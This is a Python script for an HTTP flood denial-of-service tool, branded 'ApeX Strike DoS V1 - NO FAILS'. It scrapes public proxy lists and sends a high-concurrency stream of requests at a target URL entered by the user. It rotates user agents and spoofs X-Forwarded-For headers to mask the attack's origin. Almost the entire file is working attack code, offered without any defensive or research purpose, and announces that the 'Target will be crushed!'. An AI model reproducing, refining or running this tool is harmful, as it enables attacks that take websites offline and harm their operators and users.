#!/usr/bin/env python3
import sys
import os
import shutil
import asyncio
import aiohttp
import random
import re
import itertools
import string
import time
import requests
from rich.table import Table
from rich.console import Console
from rich import print as rprint

os.system("title ApeX Strike DoS V1 - NO FAILS")

console = Console()

UA_GIST_URL = "https://gist.githubusercontent.com/eteubert/1dd9692d4dfa2548fbfb550782daa95e/raw/user_agents.csv"

def load_user_agents():
    try:
        r = requests.get(UA_GIST_URL, timeout=15)
        r.raise_for_status()
        return [ua.strip() for ua in r.text.splitlines() if ua.strip()]
    except Exception as e:
        print(f"[!] Failed to load user agents: {e}")
        return []

user_agents = load_user_agents()

print(f"[+] Loaded {len(user_agents)} user agents")

# ONLY WORKING PROXY SOURCES - TESTED FAST
proxy_sources = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
]

def loading():
    for _ in range(2):
        os.system('cls' if os.name == 'nt' else 'clear') 
        print(r"""
                    -@                
                   .##@               
                  .####@              
                  @#####@             
                . *######@            
               .##@o@#####@           
              /############@          
             /##############@         
            @######@**%######@        
           @######`     %#####o       
          @######@       ######%      
        -@#######h       ######@.`    
       /#####h**``       `**%@####@   
      @H@*`                    `*%#@  
     *`                            `* 
              ApeX Strike 
          DoS V1 - NO FAILS
             __________________
            /                  \
            \   Developed by   /
             \    venex47_    /
            \______________/ 
             """)
        time.sleep(0.5)
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.5)

class CliAttacker:
    def __init__(self, target_url, num_requests):
        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = 200  # Increased for speed
        self.request_limit = 50000000000
        self.sent = 0
        self.failed = 0
        self.success = 0
        self.working_proxies = []  # Store only working proxies

    def log(self, message):
        print(message)

    async def fetch_ip_addresses(self, url):
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                async with session.get(url, timeout=5) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
        all_ips = [ip for sublist in ip_lists if isinstance(sublist, list) for ip in sublist]
        return all_ips

    async def test_proxy(self, proxy):
        """Test if proxy works before using"""
        try:
            proxy_url = f"http://{proxy}"
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=2) as response:
                    if response.status == 200:
                        return True
        except:
            pass
        return False

    async def get_working_proxies(self):
        """Get only working proxies"""
        all_ips = await self.get_all_ips()
        self.log(f"[+] Testing {len(all_ips)} proxies...")
        
        working = []
        for ip in all_ips[:100]:  # Test first 100
            if await self.test_proxy(ip):
                working.append(ip)
                self.log(f"[✓] Working proxy: {ip}")
        
        if not working:
            self.log("[!] No working proxies found, using random IPs")
            working = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}:8080" for _ in range(50)]
        
        self.log(f"[+] Using {len(working)} working proxies")
        return working

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address.split(':')[0],
            "Accept": "*/*",
            "Cache-Control": "no-cache",
            "Connection": "close",  # Force close for speed
        }
        try:
            proxy_url = f"http://{ip_address}"
            async with session.get(self.target_url, headers=headers, proxy=proxy_url, timeout=2, ssl=False) as response:
                await response.read()  # Ensure we read the response
                self.sent += 1
                if response.status < 400:
                    self.success += 1
                else:
                    self.failed += 1
                print(f"\r\033[92m[⚡] Sent: {self.sent} | Success: {self.success} | Failed: {self.failed} | Status: {response.status}\033[0m", end='', flush=True)
        except Exception:
            # Don't count as failure - just skip
            pass

    async def attack_worker(self, session, ip_cycle):
        while self.sent < self.num_requests:
            ip = next(ip_cycle)
            await self.send_request(session, ip)

    async def attack(self):
        self.working_proxies = await self.get_working_proxies()
        ip_cycle = itertools.cycle(self.working_proxies)

        self.log(f"\n[🔥] Attacking {self.target_url}")
        self.log(f"[⚡] Requests: {self.num_requests}")
        self.log(f"[⚡] Threads: {self.max_concurrent}")
        self.log(f"[⚡] Press Ctrl+C to stop\n")

        connector = aiohttp.TCPConnector(
            ssl=False,
            limit=0,
            limit_per_host=0,
            force_close=True,
            enable_cleanup_closed=True
        )

        start_time = time.time()
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [asyncio.create_task(self.attack_worker(session, ip_cycle)) for _ in range(self.max_concurrent)]
            
            try:
                await asyncio.gather(*tasks)
            except asyncio.CancelledError:
                pass
            except KeyboardInterrupt:
                print("\n\n[!] Attack stopped by user")
            
            for task in tasks:
                task.cancel()
        
        elapsed_time = time.time() - start_time
        print(f"\n\n\033[92m[✓] Attack finished in {elapsed_time:.2f} seconds\033[0m")
        print(f"\033[92m[✓] Total: {self.sent} | Success: {self.success} | Failed: {self.failed}\033[0m")
        if elapsed_time > 0:
            print(f"\033[92m[✓] Rate: {self.sent/elapsed_time:.1f} req/sec\033[0m")

    def run(self):
        asyncio.run(self.attack())

def print_banner():
    columns = shutil.get_terminal_size().columns

    banner = r"""
                    -@                
                   .##@               
                  .####@              
                  @#####@             
                . *######@            
               .##@o@#####@           
              /############@          
             /##############@         
            @######@**%######@        
           @######`     %#####o       
          @######@       ######%      
        -@#######h       ######@.`    
       /#####h**``       `**%@####@   
      @H@*`                    `*%#@  
     *`                            `* 
      ApeX Strike 
        DoS V1 - NO FAILS
       __________________
      /                  \
      \   Developed by   /
       \    venex47_    /
      \______________/

"""

    start_color = (0, 150, 255)
    end_color = (255, 50, 200)

    def interpolate_color(start, end, factor):
        return tuple(int(start[i] + (end[i] - start[i]) * factor) for i in range(3))

    lines = banner.splitlines()
    total_lines = len(lines)

    for i, line in enumerate(lines):
        factor = i / max(total_lines - 1, 1)  
        r, g, b = interpolate_color(start_color, end_color, factor)
        print(f"\033[38;2;{r};{g};{b}m{line.center(columns)}\033[0m")

if __name__ == "__main__":
    print_banner()
    print("")
    
    target_url = input("Enter Target URL: ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    try:
        num_requests = int(input("Enter Number of Requests: ").strip())
    except ValueError:
        print("\033[91mError: Number of requests must be an integer!\033[0m")
        sys.exit(1)
    
    if not target_url or num_requests <= 0:
        print("\033[91mError: Enter a valid URL and a positive number of requests!\033[0m")
        sys.exit(1)
    
    print("\n\033[93mDoS attack started. Target will be crushed!\033[0m")
    print("\033[93mAttack has begun! Check the logs!\033[0m\n")
    
    attacker = CliAttacker(target_url, num_requests)
    attacker.run()
